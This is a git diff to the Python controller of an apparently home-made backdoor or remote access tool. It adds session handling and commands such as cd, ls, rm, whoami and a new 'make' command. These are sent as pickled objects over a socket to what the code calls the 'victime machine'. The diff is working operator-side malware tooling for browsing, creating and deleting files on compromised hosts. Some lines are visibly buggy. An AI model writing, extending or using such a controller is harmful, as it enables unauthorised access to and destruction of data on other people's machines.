@@ -116,6 +116,8 @@ class Console(cmd.Cmd):
         self.LHOST = self.values['LHOST']
         self.LPORT = int(self.values['LPORT'])
 
+    def emptyline():
+        return
 
     def do_set(self, args):
         if "-h" in args:
@@ -225,25 +227,27 @@ AVAILABLE OPTIONS ARE: PROMPT, COLOR, TIMEOUT, LHOST, LPORT
                 Stdout(self.COLOR).print_error("sessions INTERACT: session id must be an integer")
                 return
 
-            if session_to_interact not in self.conn_list.keys():
+            if str(session_to_interact) not in self.conn_list.keys():
                 Stdout(self.COLOR).print_error("session id: no connection is associated with id " + str(session_to_interact))
                 return
-            #else: ### AFTER I WRITE THE BACKDOOR CODE, I WILL FIND A WAY TO CONNECT TO IT WITH THIS ID
+            else: ### AFTER I WRITE THE BACKDOOR CODE, I WILL FIND A WAY TO CONNECT TO IT WITH THIS ID
+                try:
+                    Backdoor(self.conn_list[str(session_to_interact)][0][0], self.COLOR, self.values, self.conn_list, session_to_interact).cmdloop()
+                    del self.conn_list[str(session_to_interact)]
+                except Exception as e:
+                    Stdout(self.COLOR).print_error("interact: {}".format(str(e)))
         else:
-            Stdout(self.COLOR).print_error("set " + args[0].upper() + ": Option not available. See -h for more help")
+            Stdout(self.COLOR).print_error("sessions " + args[0].upper() + ": Option not available. See -h for more help")
 
-
-    def do_connect(self, args):
-        Backdoor(self.conn_list["0"][0][0], self.COLOR, self.values).cmdloop()
-
-    
 class Backdoor(cmd.Cmd):
-    def __init__(self, client_connection, COLOR, values):
+    def __init__(self, client_connection, COLOR, values, conn_list, SESSION_ID):
         super().__init__()
         self.client = client_connection
         self.prompt = str('shell@') + str(client_connection.getsockname()[0]) + '# '
         self.COLOR = COLOR
         self.values = values
+        self.conn_list = conn_list
+        self.SESSION_ID = SESSION_ID
 
     def emptyline(self):
         return
@@ -268,7 +272,8 @@ class Backdoor(cmd.Cmd):
                 '4': 'Not A Directory Error',
                 '5': 'OS Error',
                 '6': 'Broken Pipe Error',
-                '7': 'Timeout Error'
+                '7': 'Timeout Error',
+                '8': 'File Exists Error',
                 }
         
         if code in error_codes:
@@ -332,6 +337,12 @@ class Backdoor(cmd.Cmd):
         except socket.timeout:
             Stdout(self.COLOR).print_error(self.error_handler(code="7"))
 
+    def remove(self, options, args):
+        for option in options:
+            if option in args:
+                args = args.replace(option, '')
+        return args
+
     def do_whoami(self, args):
         if "-h" in args:
             Stdout(self.COLOR).print_line("whoami: Prints the username of the victime machine")
@@ -354,6 +365,7 @@ class Backdoor(cmd.Cmd):
         else:
             try:
                 self.send_msg(self.client, b"exit")
+                del self.conn_list[str(self.SESSION_ID)] ### DELETING IT'S EXISTENCE
                 self.client.close()
                 Console().cmdloop()
             except Exception as e:
@@ -369,14 +381,18 @@ class Backdoor(cmd.Cmd):
                 Stdout(self.COLOR).print_line("cd: Changes the path")
                 return
             else:
+                try:
+                    args = shlex.quote(args)
+                except Exception as e:
+                    Stdout(self.COLOR).print_error("cd: " + str(args) + ": " + str(e))
                 cmd = ['cd', args]
                 cmd = pickle.dumps(cmd)
                 self.send_msg(self.client, cmd)
                 ack = self.client.recv(1).decode('UTF-8')
                 if ack == "0":
-                    Stdout(self.COLOR).print_status("cd: " + args + ": " + self.error_handler(0))
+                    Stdout(self.COLOR).print_status("cd: " + str(args) + ": " + self.error_handler(0))
                 else:
-                    Stdout(self.COLOR).print_error("cd: " + args + ": " + self.error_handler(ack))
+                    Stdout(self.COLOR).print_error("cd: " + str(args) + ": " + self.error_handler(ack))
 
     def help_cd(self):
         self.do_cd("-h")
@@ -409,17 +425,16 @@ class Backdoor(cmd.Cmd):
         long_listing = parser.long_listing
         human_readable = parser.human_readable
 
-        options = ['-s', '--size', '-l', '--long', '-t', '--Time', '-r', '--reverse', '-R', '--recursive', '-n', 'alphabetic', '-H', '--human']
-        for option in options:
-            if option in args:
-                args = args.replace(option, '')
+        args = self.remove(['-s', '--size', '-l', '--long', '-t', '--Time', '-r', '--reverse', '-R', '--recursive', '-n', 'alphabetic', '-H', '--human'], args)
 
         if args.strip() == '':
-            args = './'
-        if '\\' in args:
-            args = args.replace('\\', '\\\\')
+            args = "./"
 
-        args = shlex.split(args)
+        try:
+            args = shlex.split(args)
+        except Exception as e:
+            Stdout(self.COLOR).print_error("ls: " + str(args) + ": " + str(e))
+            return
         
         def ls(path):
             #for path in args:
@@ -436,13 +451,17 @@ class Backdoor(cmd.Cmd):
                     ack = self.client.recv(1).decode('UTF-8')
                     if ack == "0":
                         pass
+                    elif ack == "4":
+                        pass
                     else:
                         Stdout(self.COLOR).print_error("ls: " + str(path) + ": " + str(self.error_handler(code=ack)))
+                except socket.timeout:
+                    Stdout(self.COLOR).print_error("ls: {}".format(str(e)))
                 except Exception as e:
                     Stdout(self.COLOR).print_error("ls: " + str(e))
                     return
 
-                if bool(int(ack)) == False:
+                if ack == "0" or ack == "4":
                     ls = self.recv_msg(self.client)
                     ls = pickle.loads(ls)
                     if long_listing == False:
@@ -540,7 +559,7 @@ class Backdoor(cmd.Cmd):
         self.do_pwd("-h")
 
     def do_rm(self, args):
-        argparser = argparse.ArgumentParser(description="removes files and directories", prog="rm", exit_on_error=False, conflict_handler="resolve")
+        argparser = argparse.ArgumentParser(description="removes files and directories", prog="rm", exit_on_error=False, conflict_handler="resolve", epilog="If -f is given and words are also present on the command line, those from the command line are treated first")
         argparser.add_argument("path", action="store", nargs="+", help="path to file and directories to remove")
         argparser.add_argument("-r", "--recursive", action="store_true",  dest="recursive", help="removes files and directories recursively")
         argparser.add_argument("-v", "--verbose", action="store_true",  dest="verbose", help="prints the name of each file and directory removed")
@@ -559,18 +578,17 @@ class Backdoor(cmd.Cmd):
         verbose = parser.verbose
         interactive = parser.interactive
 
-        options = ['-r', '--recursive', '-i', '--interactive', '-v', '--verbose']
-        for option in options:
-            if option in args:
-                args = args.replace(option, '')
+        args = self.remove(['-r', '--recursive', '-i', '--interactive', '-v', '--verbose', '-f', '--file'], args)
 
         if args.strip() == '':
             return
 
-        if '\\' in args:
-            args = args.replace('\\', '\\\\')
+        try:
+            args = shlex.split(args)
+        except Exception as e:
+            Stdout(self.COLOR).print_error("rm: " + str(args) + ": " + str(e))
+            return
 
-        args = shlex.split(args)
         for path in args:
             if interactive == True:
                 remove = Stdin(self.COLOR).ask_question("Do you want to remove " + Color(self.COLOR).lyellow() + path + Color(self.COLOR).reset() + ", y/N: ")
@@ -587,24 +605,87 @@ class Backdoor(cmd.Cmd):
                 Stdout(self.COLOR).print_error("7")
                 return
             except Exception as e:
-                Stdout(self.COLOR).print_error("rm: " + str(e))
+                Stdout(self.COLOR).print_error("rm: {}".format(str(e)))
                 return
 
             try:
                 ack = self.client.recv(1).decode('UTF-8')
             except socket.timeout:
-                Stdout(self.COLOR).print_error("rm: " + self.error_handler("7"))
+                Stdout(self.COLOR).print_error("rm: {}".format(self.error_handler("7")))
                 return
             except Exception as e:
-                Stdout(self.COLOR).print_error("rm: " + str(e))
+                Stdout(self.COLOR).print_error("rm: {}".format(str(e)))
                 return 
             if ack == "0":
                 if verbose == True:
-                    Stdout(self.COLOR).print_debug("Removed " + Color(self.COLOR).lyellow() + str(path) + Color(self.COLOR).reset() + " successfully")
+                    Stdout(self.COLOR).print_debug("Removed {}{}{} successfully".format(Color(self.COLOR).lyellow(),str(path),Color(self.COLOR).reset()))
                 else:
                     pass
             else:
-                Stdout(self.COLOR).print_error("rm: " + str(path) + ": " + self.error_handler(ack))
+                Stdout(self.COLOR).print_error("rm: {}: {}".format(path, self.error_handler(ack)))
                 return
+    
+    def do_make(self, args):
+        argparser = argparse.ArgumentParser(description="Creates empty files or directories", prog="make", exit_on_error=False, conflict_handler="resolve")
+        argparser.add_argument("path", nargs="+", action="store", help="path to create files or directories")
+        argparser.add_argument("-d", "--directory", action="store_true", dest="directory", required=False, help="Creates directories instead of default files")
+        argparser.add_argument("-v", "--verbose", action="store_true", dest="verbose", required=False, help="prints the name of file or directory being created")
+        argparser.add_argument("-w", "--overwrite", action="store_true", dest="overwrite", required=False, help="overwrites any file or directory if already present (default: skip)")
+        argparser.add_argument("-i", "--interactive", action="store_true", dest="interactive", help="ask before creating any file or directory")
+
+        try:
+            parser =  argparser.parse_args(args.split(' '))
+        except argparse.ArgumentError as e:
+            Stdout(self.COLOR).print_error("make: " + str(e))
+            return
+        except SystemExit:
+            Stdout(self.COLOR).print_line(' ')
+            return
+
+        directory = parser.directory
+        verbose = parser.verbose
+        interactive = parser.interactive
+        overwrite = parser.overwrite
+
+        args = self.remove(['-d', '--directory', '-v', '--verbose', '-i', '--interactive', '-w', '--overwrite'], args)
+
+        try:
+            args = shlex.split(args)
+        except Exception as e:
+            Stdout(self.COLOR).print_error("make: {} : {}".format(str(args), str(e)))
+            return
+
+        for path in args:
+            if interactive == True:
+                confirm = Stdin(self.COLOR).ask_question("Do you want to create {}{}{}, y/N: ".format(Color(self.COLOR).lyellow() + path + Color(self.COLOR).reset()))
+                if confirm == True:
+                    pass
+                else:
+                    continue
+            else:
+                pass
+
+            cmd = ['make', path, directory, overwrite]
+            cmd = pickle.dumps(cmd)
+
+            self.send_msg(self.client, cmd)
+            try:
+                ack = self.client.recv(1).decode('UTF-8')
+            except socket.timeout:
+                Stdout(self.COLOR).print_error(self.error_handler("7"))
+                return
+            except Exception as e:
+                Stdout(self.COLOR).print_error("make: {}".format(e))
+                return
+
+            if ack == "0":
+                if verbose == True:
+                    Stdout(self.COLOR).print_status("Created {}{}{} successfully".format(Color(self.COLOR).lyellow() , path , Color(self.COLOR).reset()))
+                else:
+                    pass
+            else:
+                Stdout(self.COLOR).print_error("make: {} : {}".format(path, self.error_handler(str(ack))))
+
+
 
 Console().cmdloop()
